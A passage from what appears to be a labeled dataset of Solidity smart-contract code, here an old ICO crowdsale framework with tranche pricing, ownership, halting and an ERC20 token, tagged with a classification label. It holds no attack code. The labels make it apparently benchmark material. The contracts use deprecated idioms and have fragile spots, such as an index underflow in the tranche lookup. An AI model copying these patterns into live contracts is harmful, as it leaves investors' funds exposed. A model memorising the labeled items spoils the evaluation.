many active tranches we have\r\r\n  uint public trancheCount;\r\r\n\r\r\n  \/\/\/ @dev Contruction, creating a list of tranches\r\r\n  \/\/\/ @param _tranches uint[] tranches Pairs of (start amount, price)\r\r\n  function EthTranchePricing(uint[] _tranches) {\r\r\n    \/\/ Need to have tuples, length check\r\r\n    if(_tranches.length % 2 == 1 || _tranches.length >= MAX_TRANCHES*2) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    trancheCount = _tranches.length \/ 2;\r\r\n\r\r\n    uint highestAmount = 0;\r\r\n\r\r\n    for(uint i=0; i<_tranches.length\/2; i++) {\r\r\n      tranches[i].amount = _tranches[i*2];\r\r\n      tranches[i].price = _tranches[i*2+1];\r\r\n\r\r\n      \/\/ No invalid steps\r\r\n      if((highestAmount != 0) && (tranches[i].amount <= highestAmount)) {\r\r\n        throw;\r\r\n      }\r\r\n\r\r\n      highestAmount = tranches[i].amount;\r\r\n    }\r\r\n\r\r\n    \/\/ We need to start from zero, otherwise we blow up our deployment\r\r\n    if(tranches[0].amount != 0) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    \/\/ Last tranche price must be zero, terminating the crowdale\r\r\n    if(tranches[trancheCount-1].price != 0) {\r\r\n      throw;\r\r\n    }\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev This is invoked once for every pre-ICO address, set pricePerToken\r\r\n  \/\/\/      to 0 to disable\r\r\n  \/\/\/ @param preicoAddress PresaleFundCollector address\r\r\n  \/\/\/ @param pricePerToken How many weis one token cost for pre-ico investors\r\r\n  function setPreicoAddress(address preicoAddress, uint pricePerToken)\r\r\n    public\r\r\n    onlyOwner\r\r\n  {\r\r\n    preicoAddresses[preicoAddress] = pricePerToken;\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Iterate through tranches. You reach end of tranches when price = 0\r\r\n  \/\/\/ @return tuple (time, price)\r\r\n  function getTranche(uint n) public constant returns (uint, uint) {\r\r\n    return (tranches[n].amount, tranches[n].price);\r\r\n  }\r\r\n\r\r\n  function getFirstTranche() private constant returns (Tranche) {\r\r\n    return tranches[0];\r\r\n  }\r\r\n\r\r\n  function getLastTranche() private constant returns (Tranche) {\r\r\n    return tranches[trancheCount-1];\r\r\n  }\r\r\n\r\r\n  function getPricingStartsAt() public constant returns (uint) {\r\r\n    return getFirstTranche().amount;\r\r\n  }\r\r\n\r\r\n  function getPricingEndsAt() public constant returns (uint) {\r\r\n    return getLastTranche().amount;\r\r\n  }\r\r\n\r\r\n  function isSane(address _crowdsale) public constant returns(bool) {\r\r\n    \/\/ Our tranches are not bound by time, so we can&#39;t really check are we sane\r\r\n    \/\/ so we presume we are ;)\r\r\n    \/\/ In the future we could save and track raised tokens, and compare it to\r\r\n    \/\/ the Crowdsale contract.\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Get the current tranche or bail out if we are not in the tranche periods.\r\r\n  \/\/\/ @param weiRaised total amount of weis raised, for calculating the current tranche\r\r\n  \/\/\/ @return {[type]} [description]\r\r\n  function getCurrentTranche(uint weiRaised) private constant returns (Tranche) {\r\r\n    uint i;\r\r\n\r\r\n    for(i=0; i < tranches.length; i++) {\r\r\n      if(weiRaised < tranches[i].amount) {\r\r\n        return tranches[i-1];\r\r\n      }\r\r\n    }\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Get the current price.\r\r\n  \/\/\/ @param weiRaised total amount of weis raised, for calculating the current tranche\r\r\n  \/\/\/ @return The current price or 0 if we are outside trache ranges\r\r\n  function getCurrentPrice(uint weiRaised) public constant returns (uint result) {\r\r\n    return getCurrentTranche(weiRaised).price;\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Calculate the current price for buy in amount.\r\r\n  function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint) {\r\r\n\r\r\n    uint multiplier = 10 ** decimals;\r\r\n\r\r\n    \/\/ This investor is coming through pre-ico\r\r\n    if(preicoAddresses[msgSender] > 0) {\r\r\n      return value.times(multiplier) \/ preicoAddresses[msgSender];\r\r\n    }\r\r\n\r\r\n    uint price = getCurrentPrice(weiRaised);\r\r\n    return value.times(multiplier) \/ price;\r\r\n  }\r\r\n\r\r\n  function() payable {\r\r\n    throw; \/\/ No money on this contract\r\r\n  }\r\r\n\r\r\n}","label":0}
{"code":"\/**\r\r\n * Safe unsigned safe math.\r\r\n *\r\r\n * https:\/\/blog.aragon.one\/library-driven-development-in-solidity-2bebcaf88736#.750gwtwli\r\r\n *\r\r\n * Originally from https:\/\/raw.githubusercontent.com\/AragonOne\/zeppelin-solidity\/master\/contracts\/SafeMathLib.sol\r\r\n *\r\r\n * Maintained here until merged to mainline zeppelin-solidity.\r\r\n *\r\r\n *\/\r\r\nlibrary SafeMathLib {\r\r\n\r\r\n  function times(uint a, uint b) returns (uint) {\r\r\n    uint c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function minus(uint a, uint b) returns (uint) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function plus(uint a, uint b) returns (uint) {\r\r\n    uint c = a + b;\r\r\n    assert(c>=a && c>=b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function assert(bool assertion) private {\r\r\n    if (!assertion) throw;\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/*\r\r\n * Ownable\r\r\n *\r\r\n * Base contract with an owner.\r\r\n * Provides onlyOwner modifier, which prevents function from running if it is called by anyone other than the owner.\r\r\n *\/\r\r\ncontract Ownable {\r\r\n  address public owner;\r\r\n\r\r\n  function Ownable() {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n\r\r\n  modifier onlyOwner() {\r\r\n    if (msg.sender != owner) {\r\r\n      throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  function transferOwnership(address newOwner) onlyOwner {\r\r\n    if (newOwner != address(0)) {\r\r\n      owner = newOwner;\r\r\n    }\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/*\r\r\n * Haltable\r\r\n *\r\r\n * Abstract contract that allows children to implement an\r\r\n * emergency stop mechanism. Differs from Pausable by causing a throw when in halt mode.\r\r\n *\r\r\n *\r\r\n * Originally envisioned in FirstBlood ICO contract.\r\r\n *\/\r\r\ncontract Haltable is Ownable {\r\r\n  bool public halted;\r\r\n\r\r\n  modifier stopInEmergency {\r\r\n    if (halted) throw;\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  modifier onlyInEmergency {\r\r\n    if (!halted) throw;\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/\/ called by the owner on emergency, triggers stopped state\r\r\n  function halt() external onlyOwner {\r\r\n    halted = true;\r\r\n  }\r\r\n\r\r\n  \/\/ called by the owner on end of emergency, returns to normal state\r\r\n  function unhalt() external onlyOwner onlyInEmergency {\r\r\n    halted = false;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * Interface for defining crowdsale pricing.\r\r\n *\/\r\r\ncontract PricingStrategy {\r\r\n\r\r\n  \/** Interface declaration. *\/\r\r\n  function isPricingStrategy() public constant returns (bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/** Self check if all references are correctly set.\r\r\n   *\r\r\n   * Checks that pricing strategy matches crowdsale parameters.\r\r\n   *\/\r\r\n  function isSane(address crowdsale) public constant returns (bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * When somebody tries to buy tokens for X eth, calculate how many tokens they get.\r\r\n   *\r\r\n   *\r\r\n   * @param value - What is the value of the transaction send in as wei\r\r\n   * @param tokensSold - how much tokens have been sold this far\r\r\n   * @param weiRaised - how much money has been raised this far\r\r\n   * @param msgSender - who is the investor of this transaction\r\r\n   * @param decimals - how many decimal units the token has\r\r\n   * @return Amount of tokens the investor receives\r\r\n   *\/\r\r\n  function calculatePrice(uint value, uint tokensSold, uint weiRaised, address msgSender, uint decimals) public constant returns (uint tokenAmount);\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * Finalize agent defines what happens at the end of succeseful crowdsale.\r\r\n *\r\r\n * - Allocate tokens for founders, bounties and community\r\r\n * - Make tokens transferable\r\r\n * - etc.\r\r\n *\/\r\r\ncontract FinalizeAgent {\r\r\n\r\r\n  function isFinalizeAgent() public constant returns(bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/** Return true if we can run finalizeCrowdsale() properly.\r\r\n   *\r\r\n   * This is a safety check function that doesn&#39;t allow crowdsale to begin\r\r\n   * unless the finalizer has been set up properly.\r\r\n   *\/\r\r\n  function isSane() public constant returns (bool);\r\r\n\r\r\n  \/** Called once by crowdsale finalize() if the sale was success. *\/\r\r\n  function finalizeCrowdsale();\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/*\r\r\n * ERC20 interface\r\r\n * see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 {\r\r\n  uint public totalSupply;\r\r\n  function balanceOf(address who) constant returns (uint);\r\r\n  function allowance(address owner, address spender) constant returns (uint);\r\r\n\r\r\n  function transfer(address to, uint value) returns (bool ok);\r\r\n  function transferFrom(address from, address to, uint value) returns (bool ok);\r\r\n  function approve(address spender, uint value) returns (bool ok);\r\r\n  event Transfer(address indexed from, address indexed to, uint value);\r\r\n  event Approval(address indexed owner, address indexed spender, uint value);\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * A token that defines fractional units as decimals.\r\r\n *\/\r\r\ncontract FractionalERC20 is ERC20 {\r\r\n\r\r\n  uint public decimals;\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Abstract base contract for token sales.\r\r\n *\r\r\n * Handle\r\r\n * - start and end dates\r\r\n * - accepting investments\r\r\n * - minimum funding goal and refund\r\r\n * - various statistics during the crowdfund\r\r\n * - different pricing strategies\r\r\n * - different investment policies (require server side customer id, allow only whitelisted addresses)\r\r\n *\r\r\n *\/\r\r\ncontract Crowdsale is Haltable {\r\r\n\r\r\n  using SafeMathLib for uint;\r\r\n\r\r\n  \/* The token we are selling *\/\r\r\n  FractionalERC20 public token;\r\r\n\r\r\n  \/* How we are going to price our offering *\/\r\r\n  PricingStrategy public pricingStrategy;\r\r\n\r\r\n  \/* Post-success callback *\/\r\r\n  FinalizeAgent public finalizeAgent;\r\r\n\r\r\n  \/* tokens will be transfered from this address *\/\r\r\n  address public multisigWallet;\r\r\n\r\r\n  \/* if the funding goal is not reached, investors may withdraw their funds *\/\r\r\n  uint public minimumFundingGoal;\r\r\n\r\r\n  \/* the UNIX timestamp start date of the crowdsale *\/\r\r\n  uint public startsAt;\r\r\n\r\r\n  \/* the UNIX timestamp end date of the crowdsale *\/\r\r\n  uint public endsAt;\r\r\n\r\r\n  \/* the number of tokens already sold through this contract*\/\r\r\n  uint public tokensSold = 0;\r\r\n\r\r\n  \/* How many wei of funding we have raised *\/\r\r\n  uint public weiRaised = 0;\r\r\n\r\r\n  \/* How many distinct addresses have invested *\/\r\r\n  uint public investorCount = 0;\r\r\n\r\r\n  \/* How much wei we have returned back to the contract after a failed crowdfund. *\/\r\r\n  uint public loadedRefund = 0;\r\r\n\r\r\n  \/* How much wei we have given back to investors.*\/\r\r\n  uint public weiRefunded = 0;\r\r\n\r\r\n  \/* Has this crowdsale been finalized *\/\r\r\n  bool public finalized;\r\r\n\r\r\n  \/* Do we need to have unique contributor id for each customer *\/\r\r\n  bool public requireCustomerId;\r\r\n\r\r\n  \/**\r\r\n    * Do we verify that contributor has been cleared on the server side (accredited investors only).\r\r\n    * This method was first used in FirstBlood crowdsale to ensure all contributors have accepted terms on sale (on the web).\r\r\n    *\/\r\r\n  bool public requiredSignedAddress;\r\r\n\r\r\n  \/* Server side address that signed allowed contributors (Ethereum addresses) that can participate the crowdsale *\/\r\r\n  address public signerAddress;\r\r\n\r\r\n  \/** How much ETH each address has invested to this crowdsale *\/\r\r\n  mapping (address => uint256) public investedAmountOf;\r\r\n\r\r\n  \/** How much tokens this crowdsale has credited for each investor address *\/\r\r\n  mapping (address => uint256) public tokenAmountOf;\r\r\n\r\r\n  \/** Addresses that are allowed to invest even before ICO offical opens. For testing, for ICO partners, etc. *\/\r\r\n  mapping (address => bool) public earlyParticipantWhitelist;\r\r\n\r\r\n  \/** This is for manul testing for the interaction from owner wallet. You can set it to any value and inspect this in blockchain explorer to see that crowdsale interaction works. *\/\r\r\n  uint public ownerTestValue;\r\r\n\r\r\n  \/** State machine\r\r\n   *\r\r\n   * - Preparing: All contract initialization calls and variables have not been set yet\r\r\n   * - Prefunding: We have not passed start time yet\r\r\n   * - Funding: Active crowdsale\r\r\n   * - Success: Minimum funding goal reached\r\r\n   * - Failure: Minimum funding goal not reached before ending time\r\r\n   * - Finalized: The finalized has been called and succesfully executed\r\r\n   * - Refunding: Refunds are loaded on the contract for reclaim.\r\r\n   *\/\r\r\n  enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized, Refunding}\r\r\n\r\r\n  \/\/ A new investment was made\r\r\n  event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\r\r\n\r\r\n  \/\/ Refund was processed for a contributor\r\r\n  event Refund(address investor, uint weiAmount);\r\r\n\r\r\n  \/\/ The rules were changed what kind of investments we accept\r\r\n  event InvestmentPolicyChanged(bool requireCustomerId, bool requiredSignedAddress, address signerAddress);\r\r\n\r\r\n  \/\/ Address early participation whitelist status changed\r\r\n  event Whitelisted(address addr, bool status);\r\r\n\r\r\n  \/\/ Crowdsale end time has been changed\r\r\n  event EndsAtChanged(uint endsAt);\r\r\n\r\r\n  function Crowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) {\r\r\n\r\r\n    if(_minimumFundingGoal != 0) {\r\r\n      \/\/ Mysterium specific fix to allow funding goal only be set in CHF\r\r\n    }\r\r\n\r\r\n    owner = msg.sender;\r\r\n\r\r\n    token = FractionalERC20(_token);\r\r\n\r\r\n    setPricingStrategy(_pricingStrategy);\r\r\n\r\r\n    multisigWallet = _multisigWallet;\r\r\n    if(multisigWallet == 0) {\r\r\n        throw;\r\r\n    }\r\r\n\r\r\n    if(_start == 0) {\r\r\n        throw;\r\r\n    }\r\r\n\r\r\n    startsAt = _start;\r\r\n\r\r\n    if(_end == 0) {\r\r\n        throw;\r\r\n    }\r\r\n\r\r\n    endsAt = _end;\r\r\n\r\r\n    \/\/ Don&#39;t mess the dates\r\r\n    if(startsAt >= endsAt) {\r\r\n        throw;\r\r\n    }\r\r\n\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Don&#39;t expect to just send in money and get tokens.\r\r\n   *\/\r\r\n  function() payable {\r\r\n    throw;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Make an investment.\r\r\n   *\r\r\n   * Crowdsale must be running for one to invest.\r\r\n   * We must have not pressed the emergency brake.\r\r\n   *\r\r\n   * @param receiver The Ethereum address who receives the tokens\r\r\n   * @param customerId (optional) UUID v4 to track the successful payments on the server side\r\r\n   *\r\r\n   *\/\r\r\n  function investInternal(address receiver, uint128 customerId) stopInEmergency private {\r\r\n\r\r\n    \/\/ Determine if it&#39;s a good time to accept investment from this participant\r\r\n    if(getState() == State.PreFunding) {\r\r\n      \/\/ Are we whitelisted for early deposit\r\r\n      if(!earlyParticipantWhitelist[receiver]) {\r\r\n        throw;\r\r\n      }\r\r\n    } else if(getState() == State.Funding) {\r\r\n      \/\/ Retail participants can only come in when the crowdsale is running\r\r\n      \/\/ pass\r\r\n    } else {\r\r\n      \/\/ Unwanted state\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    uint weiAmount = msg.value;\r\r\n    uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\r\r\n\r\r\n    if(tokenAmount == 0) {\r\r\n      \/\/ Dust transaction\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    if(investedAmountOf[receiver] == 0) {\r\r\n       \/\/ A new investor\r\r\n       investorCount++;\r\r\n    }\r\r\n\r\r\n    \/\/ Update investor\r\r\n    investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\r\r\n    tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\r\r\n\r\r\n    \/\/ Update totals\r\r\n    weiRaised = weiRaised.plus(weiAmount);\r\r\n    tokensSold = tokensSold.plus(tokenAmount);\r\r\n\r\r\n    \/\/ Check that we did not bust the cap\r\r\n    if(isBreakingCap(tokenAmount, weiAmount, weiRaised, tokensSold)) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    assignTokens(receiver, tokenAmount);\r\r\n\r\r\n    \/\/ Pocket the money\r\r\n    if(!multisigWallet.send(weiAmount)) throw;\r\r\n\r\r\n    \/\/ Tell us invest was success\r\r\n    Invested(receiver, weiAmount, tokenAmount, customerId);\r\r\n\r\r\n    \/\/ Call the invest hooks\r\r\n    onInvest();\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Track who is the customer making the payment so we can send thank you email.\r\r\n   *\/\r\r\n  function investWithCustomerId(address addr, uint128 customerId) public payable {\r\r\n    if(requiredSignedAddress) throw; \/\/ Crowdsale allows only server-side signed participants\r\r\n    if(customerId == 0) throw;  \/\/ UUIDv4 sanity check\r\r\n    investInternal(addr, customerId);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow anonymous contributions to this crowdsale.\r\r\n   *\/\r\r\n  function invest(address addr) public payable {\r\r\n    if(requireCustomerId) throw; \/\/ Crowdsale needs to track partipants for thank you email\r\r\n    if(requiredSignedAddress) throw; \/\/ Crowdsale allows only server-side signed participants\r\r\n    investInternal(addr, 0);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Invest to tokens, recognize the payer.\r\r\n   *\r\r\n   *\/\r\r\n  function buyWithCustomerId(uint128 customerId) public payable {\r\r\n    investWithCustomerId(msg.sender, customerId);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * The basic entry point to participate the crowdsale process.\r\r\n   *\r\r\n   * Pay for funding, get invested tokens back in the sender address.\r\r\n   *\/\r\r\n  function buy() public payable {\r\r\n    invest(msg.sender);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Finalize a succcesful crowdsale.\r\r\n   *\r\r\n   * The owner can triggre a call the contract that provides post-crowdsale actions, like releasing the tokens.\r\r\n   *\/\r\r\n  function finalize() public inState(State.Success) onlyOwner stopInEmergency {\r\r\n\r\r\n    \/\/ Already finalized\r\r\n    if(finalized) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    \/\/ Finalizing is optional. We only call it if we are given a finalizing agent.\r\r\n    if(address(finalizeAgent) != 0) {\r\r\n      finalizeAgent.finalizeCrowdsale();\r\r\n    }\r\r\n\r\r\n    finalized = true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow to (re)set finalize agent.\r\r\n   *\r\r\n   * Design choice: no state restrictions on setting this, so that we can fix fat finger mistakes.\r\r\n   *\/\r\r\n  function setFinalizeAgent(FinalizeAgent addr) onlyOwner {\r\r\n    finalizeAgent = addr;\r\r\n\r\r\n    \/\/ Don&#39;t allow setting bad agent\r\r\n    if(!finalizeAgent.isFinalizeAgent()) {\r\r\n      throw;\r\r\n    }\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Set policy do we need to have server-side customer ids for the investments.\r\r\n   *\r\r\n   *\/\r\r\n  function setRequireCustomerId(bool value) onlyOwner {\r\r\n    requireCustomerId = value;\r\r\n    InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow addresses to do early participation.\r\r\n   *\r\r\n   * TODO: Fix spelling error in the name\r\r\n   *\/\r\r\n  function setEarlyParicipantWhitelist(address addr, bool status) onlyOwner {\r\r\n    earlyParticipantWhitelist[addr] = status;\r\r\n    Whitelisted(addr, status);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow to (re)set pricing strategy.\r\r\n   *\r\r\n   * Design choice: no state restrictions on the set, so that we can fix fat finger mistakes.\r\r\n   *\/\r\r\n  function setPricingStrategy(PricingStrategy _pricingStrategy) onlyOwner {\r\r\n    pricingStrategy = _pricingStrategy;\r\r\n\r\r\n    \/\/ Don&#39;t allow setting bad agent\r\r\n    if(!pricingStrategy.isPricingStrategy()) {\r\r\n      throw;\r\r\n    }\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow load refunds back on the contract for the refunding.\r\r\n   *\r\r\n   * The team can transfer the funds back on the smart contract in the case the minimum goal was not reached..\r\r\n   *\/\r\r\n  function loadRefund() public payable inState(State.Failure) {\r\r\n    if(msg.value == 0) throw;\r\r\n    loadedRefund = loadedRefund.plus(msg.value);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Investors can claim refund.\r\r\n   *\/\r\r\n  function refund() public inState(State.Refunding) {\r\r\n    uint256 weiValue = investedAmountOf[msg.sender];\r\r\n    if (weiValue == 0) throw;\r\r\n    investedAmountOf[msg.sender] = 0;\r\r\n    weiRefunded = weiRefunded.plus(weiValue);\r\r\n    Refund(msg.sender, weiValue);\r\r\n    if (!msg.sender.send(weiValue)) throw;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @return true if the crowdsale has raised enough money to be a succes\r\r\n   *\/\r\r\n  function isMinimumGoalReached() public constant returns (bool reached) {\r\r\n    return weiRaised >= minimumFundingGoal;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Check if the contract relationship looks good.\r\r\n   *\/\r\r\n  function isFinalizerSane() public constant returns (bool sane) {\r\r\n    return finalizeAgent.isSane();\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Check if the contract relationship looks good.\r\r\n   *\/\r\r\n  function isPricingSane() public constant returns (bool sane) {\r\r\n    return pricingStrategy.isSane(address(this));\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Crowdfund state machine management.\r\r\n   *\r\r\n   * We make it a function and do not assign the result to a variable, so there is no chance of the variable being stale.\r\r\n   *\/\r\r\n  function getState() public constant returns (State) {\r\r\n    if(finalized) return State.Finalized;\r\r\n    else if (address(finalizeAgent) == 0) return State.Preparing;\r\r\n    else if (!finalizeAgent.isSane()) return State.Preparing;\r\r\n    else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\r\r\n    else if (block.timestamp < startsAt) return State.PreFunding;\r\r\n    else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\r\r\n    else if (isMinimumGoalReached()) return State.Success;\r\r\n    else if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;\r\r\n    else return State.Failure;\r\r\n  }\r\r\n\r\r\n  \/** This is for manual testing of multisig wallet interaction *\/\r\r\n  function setOwnerTestValue(uint val) onlyOwner {\r\r\n    ownerTestValue = val;\r\r\n  }\r\r\n\r\r\n  \/** Interface marker. *\/\r\r\n  function isCrowdsale() public constant returns (bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * Allow subcontracts to take extra actions on a successful invet.\r\r\n   *\/\r\r\n  function onInvest() internal {\r\r\n\r\r\n  }\r\r\n\r\r\n  \/\/\r\r\n  \/\/ Modifiers\r\r\n  \/\/\r\r\n\r\r\n  \/** Modified allowing execution only if the crowdsale is currently running.  *\/\r\r\n  modifier inState(State state) {\r\r\n    if(getState() != state) throw;\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow crowdsale owner to close early or extend the crowdsale.\r\r\n   *\r\r\n   * This is useful e.g. for a manual soft cap implementation:\r\r\n   * - after X amount is reached determine manual closing\r\r\n   *\r\r\n   * This may put the crowdsale to an invalid state,\r\r\n   * but we trust owners know what they are doing.\r\r\n   *\r\r\n   *\/\r\r\n  function setEndsAt(uint time) onlyOwner {\r\r\n\r\r\n    if(now > time) {\r\r\n      throw; \/\/ Don&#39;t change past\r\r\n    }\r\r\n\r\r\n    endsAt = time;\r\r\n    EndsAtChanged(endsAt);\r\r\n  }\r\r\n\r\r\n  \/\/\r\r\n  \/\/ Abstract functions\r\r\n  \/\/\r\r\n\r\r\n  \/**\r\r\n   * Check if the current invested breaks our cap rules.\r\r\n   *\r\r\n   *\r\r\n   * The child contract must define their own cap setting rules.\r\r\n   * We allow a lot of flexibility through different capping strategies (ETH, token count)\r\r\n   * Called from invest().\r\r\n   *\r\r\n   * @param weiAmount The amount of wei the investor tries to invest in the current transaction\r\r\n   * @param tokenAmount The amount of tokens we try to give to the investor in the current transaction\r\r\n   * @param weiRaisedTotal What would be our total raised balance after this transaction\r\r\n   * @param tokensSoldTotal What would be our total sold tokens count after this transaction\r\r\n   *\r\r\n   * @return true if taking this investment would break our cap rules\r\r\n   *\/\r\r\n  function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken);\r\r\n\r\r\n  \/**\r\r\n   * Check if the current crowdsale is full and we can no longer sell any tokens.\r\r\n   *\/\r\r\n  function isCrowdsaleFull() public constant returns (bool);\r\r\n\r\r\n  \/**\r\r\n   * Create new tokens or transfer issued tokens to the investor depending on the cap model.\r\r\n   *\/\r\r\n  function assignTokens(address receiver, uint tokenAmount) private;\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Math operations with safety checks\r\r\n *\/\r\r\ncontract SafeMath {\r\r\n  function safeMul(uint a, uint b) internal returns (uint) {\r\r\n    uint c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function safeDiv(uint a, uint b) internal returns (uint) {\r\r\n    assert(b > 0);\r\r\n    uint c = a \/ b;\r\r\n    assert(a == b * c + a % b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function safeSub(uint a, uint b) internal returns (uint) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function safeAdd(uint a, uint b) internal returns (uint) {\r\r\n    uint c = a + b;\r\r\n    assert(c>=a && c>=b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function max64(uint64 a, uint64 b) internal constant returns (uint64) {\r\r\n    return a >= b ? a : b;\r\r\n  }\r\r\n\r\r\n  function min64(uint64 a, uint64 b) internal constant returns (uint64) {\r\r\n    return a < b ? a : b;\r\r\n  }\r\r\n\r\r\n  function max256(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    return a >= b ? a : b;\r\r\n  }\r\r\n\r\r\n  function min256(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    return a < b ? a : b;\r\r\n  }\r\r\n\r\r\n  function assert(bool assertion) internal {\r\r\n    if (!assertion) {\r\r\n      throw;\r\r\n    }\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Standard ERC20 token with Short Hand Attack and approve() race condition mitigation.\r\r\n *\r\r\n * Based on code by FirstBlood:\r\r\n * https:\/\/github.com\/Firstbloodio\/token\/blob\/master\/smart_contract\/FirstBloodToken.sol\r\r\n *\/\r\r\ncontract StandardToken is ERC20, SafeMath {\r\r\n\r\r\n  \/* Token supply got increased and a new owner received these tokens *\/\r\r\n  event Minted(address receiver, uint amount);\r\r\n\r\r\n  \/* Actual balances of token holders *\/\r\r\n  mapping(address => uint) balances;\r\r\n\r\r\n  \/* approve() allowances *\/\r\r\n  mapping (address => mapping (address => uint)) allowed;\r\r\n\r\r\n  \/**\r\r\n   *\r\r\n   * Fix for the ERC20 short address attack\r\r\n   *\r\r\n   * http:\/\/vessenes.com\/the-erc20-short-address-attack-explained\/\r\r\n   *\/\r\r\n  modifier onlyPayloadSize(uint size) {\r\r\n     if(msg.data.length != size + 4) {\r\r\n       throw;\r\r\n     }\r\r\n     _;\r\r\n  }\r\r\n\r\r\n  function transfer(address _to, uint _value) onlyPayloadSize(2 * 32) returns (bool success) {\r\r\n    balances[msg.sender] = safeSub(balances[msg.sender], _value);\r\r\n    balances[_to] = safeAdd(balances[_to], _value);\r\r\n    Transfer(msg.sender, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function transferFrom(address _from, address _to, uint _value) returns (bool success) {\r\r\n    uint _allowance = allowed[_from][msg.sender];\r\r\n\r\r\n    \/\/ Check is not needed because safeSub(_allowance, _value) will already throw if this condition is not met\r\r\n    \/\/ if (_value > _allowance) throw;\r\r\n\r\r\n    balances[_to] = safeAdd(balances[_to], _value);\r\r\n    balances[_from] = safeSub(balances[_from], _value);\r\r\n    allowed[_from][msg.sender] = safeSub(_allowance, _value);\r\r\n    Transfer(_from, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function balanceOf(address _owner) constant returns (uint balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n\r\r\n  function approve(address _spender, uint _value) returns (bool success) {\r\r\n\r\r\n    \/\/ To change the approve amount you first have to reduce the addresses`\r\r\n    \/\/  allowance to zero by calling `approve(_spender, 0)` if it is not\r\r\n    \/\/  already 0 to mitigate the race condition described here:\r\r\n    \/\/  https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n    if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\r\r\n\r\r\n    allowed[msg.sender][_spender] = _value;\r\r\n    Approval(msg.sender, _spender, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function 